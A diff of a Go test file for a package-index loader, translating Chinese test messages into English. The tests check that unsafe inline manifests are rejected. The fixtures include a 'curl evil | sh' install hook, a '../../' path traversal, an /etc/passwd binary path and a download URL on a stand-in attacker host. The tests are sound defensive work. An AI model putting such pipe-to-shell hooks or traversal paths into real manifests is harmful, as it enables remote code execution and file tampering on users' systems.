@@ -25,7 +25,7 @@ func loadOne(t *testing.T, e Entry) (*Index, int) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, skipped, err := Load(data, "默认")
+	got, skipped, err := Load(data, "default")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -35,64 +35,67 @@ func loadOne(t *testing.T, e Entry) (*Index, int) {
 func TestLoadKeepsGoodInlineToyfile(t *testing.T) {
 	got, skipped := loadOne(t, Entry{ID: "Derrity/tinyserve", Source: "github:Derrity/tinyserve", Toyfile: inlineGood})
 	if skipped != 0 || len(got.Packages) != 1 {
-		t.Fatalf("合法的内联 toyfile 被跳过了：skipped=%d packages=%d", skipped, len(got.Packages))
+		t.Fatalf("a valid inline toyfile was skipped: skipped=%d packages=%d", skipped, len(got.Packages))
 	}
 	if got.Packages[0].Toyfile != inlineGood {
-		t.Error("内联 toyfile 原文没被保留下来")
+		t.Error("the raw inline toyfile was not preserved")
 	}
 }
 
-// 坏的内联 toyfile 必须在 Load 就被判坏记录 —— 留到安装时才炸的话，
-// 用户已经在等下载了，而报错会长得像上游仓库的问题。
+// A bad inline toyfile must be judged a bad record at Load time. Letting it blow
+// up at install time means the user is already waiting on a download, and the
+// error reads like a problem with the upstream repo.
 func TestLoadSkipsBadInlineToyfile(t *testing.T) {
 	bad := map[string]string{
-		"不是 TOML":        "这不是 toml {{{",
-		"没有 name":        "[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
-		"既没资产也没脚本":       "name = \"x\"\n",
-		"bin 指向绝对路径":     "name = \"x\"\n[bin]\nx = \"/etc/passwd\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
-		"bin 含 ..":       "name = \"x\"\n[bin]\nx = \"../../x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
-		"artifact 是 URL": "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"https://evil.example/x.tar.gz\"\n",
-		"平台 key 不合法":     "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"Linux\" = \"a.tar.gz\"\n",
-		"有 hook 键":       "name = \"x\"\ninstall = \"curl evil | sh\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
+		"not TOML":                       "this is not toml {{{",
+		"no name":                        "[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
+		"neither artifact nor script":    "name = \"x\"\n",
+		"bin points at an absolute path": "name = \"x\"\n[bin]\nx = \"/etc/passwd\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
+		"bin contains ..":                "name = \"x\"\n[bin]\nx = \"../../x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
+		"artifact is a URL":              "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"https://evil.example/x.tar.gz\"\n",
+		"illegal platform key":           "name = \"x\"\n[bin]\nx = \"x\"\n[artifact]\n\"Linux\" = \"a.tar.gz\"\n",
+		"carries a hook key":             "name = \"x\"\ninstall = \"curl evil | sh\"\n[bin]\nx = \"x\"\n[artifact]\n\"linux/amd64\" = \"a.tar.gz\"\n",
 	}
 	for name, tf := range bad {
 		t.Run(name, func(t *testing.T) {
 			got, skipped := loadOne(t, Entry{ID: "a/b", Source: "github:a/b", Toyfile: tf})
 			if skipped != 1 || len(got.Packages) != 0 {
-				t.Fatalf("这条内联 toyfile 应该被判坏记录：skipped=%d packages=%d", skipped, len(got.Packages))
+				t.Fatalf("this inline toyfile should have been judged a bad record: skipped=%d packages=%d", skipped, len(got.Packages))
 			}
 		})
 	}
 }
 
-// 内联的那份走的是和上游一模一样的 ParseFrom，只是 Origin 不同。
+// The inline copy goes through exactly the same ParseFrom as upstream; only the
+// Origin differs.
 func TestInlineParsesWithIndexOrigin(t *testing.T) {
 	tf, err := toyfile.ParseFrom([]byte(inlineGood), toyfile.OriginIndex)
 	if err != nil {
 		t.Fatal(err)
 	}
 	if tf.Origin != toyfile.OriginIndex {
-		t.Errorf("Origin = %q，想要 %q", tf.Origin, toyfile.OriginIndex)
+		t.Errorf("Origin = %q, want %q", tf.Origin, toyfile.OriginIndex)
 	}
 	up, err := toyfile.Parse([]byte(inlineGood))
 	if err != nil {
 		t.Fatal(err)
 	}
 	if up.Origin != toyfile.OriginUpstream {
-		t.Errorf("Parse 的 Origin = %q，想要 %q", up.Origin, toyfile.OriginUpstream)
+		t.Errorf("Parse gave Origin = %q, want %q", up.Origin, toyfile.OriginUpstream)
 	}
-	// 除了 Origin，两边解析结果必须一致 —— 校验没有第二条更松的路。
+	// Apart from Origin the two parses must agree — validation has no second,
+	// looser path.
 	tf.Origin, up.Origin = "", ""
 	if !reflect.DeepEqual(tf, up) {
-		t.Error("同一份字节按两种来源解析出了不同结果")
+		t.Error("the same bytes parsed differently depending on their origin")
 	}
 }
 
-// toy.toml 里自称 origin 不能生效：能自称就等于内联那份可以冒充上游，
-// 而信任等级正是照着来源分档的。
+// A toy.toml must not be able to declare its own origin: if it could, the inline
+// copy could pose as upstream — and the trust tier is assigned by origin.
 func TestToyfileCannotDeclareItsOwnOrigin(t *testing.T) {
 	_, err := toyfile.ParseFrom([]byte("origin = \"upstream\"\n"+inlineGood), toyfile.OriginIndex)
 	if err == nil || !strings.Contains(err.Error(), "does not recognize") {
-		t.Fatalf("toy.toml 里写 origin 应该被当成不认识的键拒掉，得到 %v", err)
+		t.Fatalf("an origin key in toy.toml must be rejected as an unrecognized key, got %v", err)
 	}
 }
